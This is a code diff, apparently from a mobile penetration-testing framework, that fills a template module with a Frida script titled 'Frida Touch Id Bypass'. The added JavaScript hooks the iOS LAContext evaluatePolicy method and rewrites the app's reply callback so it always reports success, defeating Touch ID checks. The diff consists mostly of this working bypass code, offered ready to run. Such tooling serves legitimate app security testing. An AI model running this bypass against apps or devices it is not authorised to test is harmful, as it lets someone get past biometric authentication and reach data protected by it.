@@ -3,9 +3,9 @@ from core.framework.module import FridaScript
 
 class Module(FridaScript):
     meta = {
-        'name': 'Title',
-        'author': '@AUTHOR (@TWITTER)',
-        'description': 'Description',
+        'name': 'Frida Touch Id Bypass',
+        'author': 'Henry Hoggard',
+        'description': 'Bypasses Touch Id authentication using frida instead. Can be used on devices that do not support cycript.',
         'options': (
             ('output', True, False, 'Full path of the output file'),
         ),
@@ -13,7 +13,18 @@ class Module(FridaScript):
 
     JS = '''\
 if(ObjC.available) {
-    // Actual payload
+    var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
+    Interceptor.attach(hook.implementation, {
+        onEnter: function(args) {
+            send("Hooking Touch Id..")
+            var block = new ObjC.Block(args[4]);
+            const appCallback = block.implementation;
+            block.implementation = function (error, value)  {
+                const result = appCallback(1, null);
+                return result;
+            };
+        },
+    });
 } else {
     console.log("Objective-C Runtime is not available!");
 }
@@ -25,7 +36,7 @@ if(ObjC.available) {
     def __init__(self, params):
         FridaScript.__init__(self, params)
         # Setting default output file
-        self.options['output'] = self.local_op.build_output_path_for_file("template.txt", self)
+        self.options['output'] = self.local_op.build_output_path_for_file("frida_touch_id_bypass.txt", self)
 
     # ==================================================================================================================
     # RUN
